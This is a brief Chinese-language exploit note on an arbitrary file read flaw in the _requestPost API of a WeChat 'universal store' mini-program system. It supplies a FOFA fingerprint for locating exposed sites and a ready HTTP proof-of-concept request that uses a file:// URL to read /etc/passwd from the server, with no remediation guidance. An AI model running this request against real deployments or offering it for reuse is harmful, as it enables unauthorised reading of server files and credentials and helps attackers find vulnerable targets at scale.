# 微信万能门店小程序系统_requestPost存在任意文件读取漏洞
万能门店微信小程序不限制小程序生成数量，支持多页面，预约功能等。 本套源码包含多商户插件、点餐插件、拼团插件、积分兑换、小程序手机客服等全套十个插件模块。支持后台一键扫码上传小程序，和后台通用模板。微信万能门店小程序系统存在任意文件读取漏洞

## fofa
```javascript
"/comhome/cases/index.html" 
```

![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1732115890021-a19be87f-f478-4ee9-971e-bdbeb555e80f.png)

## poc
```java
GET /api/wxapps/_requestPost?url=file:///etc/passwd&data=1 HTTP/2
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
```

![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1732115844099-9921c837-e60b-49bb-abba-ee32694c6075.png)

